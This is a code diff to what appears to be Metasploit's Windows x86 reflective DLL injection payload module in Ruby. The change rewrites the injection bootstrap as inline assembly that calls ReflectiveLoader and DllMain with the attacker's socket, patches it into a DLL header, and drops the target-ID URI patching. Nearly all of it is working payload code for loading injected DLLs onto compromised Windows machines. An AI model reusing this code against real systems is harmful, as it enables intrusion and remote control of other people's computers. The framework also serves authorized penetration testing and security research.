@@ -29,18 +29,8 @@ module Payload::Windows::ReflectiveDllInject
       ],
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
-      'PayloadCompat' =>
-        {
-          'Convention' => 'sockedi -https',
-        },
-      'Stage'         =>
-        {
-          'Offsets' =>
-            {
-              'EXITFUNC' => [ 33, 'V' ]
-            },
-          'Payload' => ""
-        }
+      'PayloadCompat' => { 'Convention' => 'sockedi -https', },
+      'Stage'         => { 'Payload'   => "" }
       ))
 
     register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
@@ -50,55 +40,59 @@ module Payload::Windows::ReflectiveDllInject
     datastore['DLL']
   end
 
-  def stage_payload(target_id=nil)
+  def asm_invoke_dll(opts={})
+    asm = %Q^
+        ; prologue
+          dec ebp               ; 'M'
+          pop edx               ; 'Z'
+          call $+5              ; call next instruction
+          pop ebx               ; get the current location (+7 bytes)
+          push edx              ; restore edx
+          inc ebp               ; restore ebp
+          push ebp              ; save ebp for later
+          mov ebp, esp          ; set up a new stack frame
+        ; Invoke ReflectiveLoader()
+          ; add the offset to ReflectiveLoader() (0x????????)
+          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
+          call ebx              ; invoke ReflectiveLoader()
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
+          push edi              ; push the socket handle
+          push 4                ; indicate that we have attached
+          push eax              ; push some arbitrary value for hInstance
+          mov ebx, eax          ; save DllMain for another call
+          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+          ; push the exitfunk value onto the stack
+          push #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
+          push 5                ; indicate that we have detached
+          push eax              ; push some arbitrary value for hInstance
+          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+    ^
+  end
+
+  def stage_payload(opts = {})
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(library_path)
 
-    exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
+    asm_opts = {
+      rdi_offset: offset,
+      exitfunk:   'thread'  # default to 'thread' for migration
+    }
 
-    bootstrap = "\x4D" +                            # dec ebp             ; M
-          "\x5A" +                            # pop edx             ; Z
-          "\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
-          "\x5B" +                            # pop ebx             ; get our location (+7)
-          "\x52" +                            # push edx            ; push edx back
-          "\x45" +                            # inc ebp             ; restore ebp
-          "\x55" +                            # push ebp            ; save ebp
-          "\x89\xE5" +                        # mov ebp, esp        ; setup fresh stack frame
-          "\x81\xC3" + [offset-7].pack( "V" ) + # add ebx, 0x???????? ; add offset to ReflectiveLoader
-          "\xFF\xD3" +                        # call ebx            ; call ReflectiveLoader
-          "\x89\xC3" +                        # mov ebx, eax        ; save DllMain for second call
-          "\x57" +                            # push edi            ; our socket
-          "\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
-          "\x50" +                            # push eax            ; some value for hinstance
-          "\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
-          "\x68" + exit_funk +                # push 0x????????     ; our EXITFUNC placeholder
-          "\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
-          "\x50" +                            # push eax            ; some value for hinstance
-          "\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
+    asm = asm_invoke_dll(asm_opts)
+
+    # generate the bootstrap asm
+    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
-    if( bootstrap.length > 62 )
-      print_error( "Reflective Dll Injection (x86) generated an oversized bootstrap!" )
-      return
+    if bootstrap.length > 62
+      raise RuntimeError, "Reflective DLL Injection (x86) generated an oversized bootstrap!"
     end
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
 
-    # patch the target ID into the URI if specified
-    if target_id
-      i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
-      if i
-        t = target_id.to_s
-        raise "Target ID must be less than 5 bytes" if t.length > 4
-        u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
-        print_status("Patching Target ID #{t} into DLL")
-        dll[i, u.length] = u
-      end
-    end
-
-    # return our stage to be loaded by the intermediate stager
-    return dll
+    dll
   end
 
 end
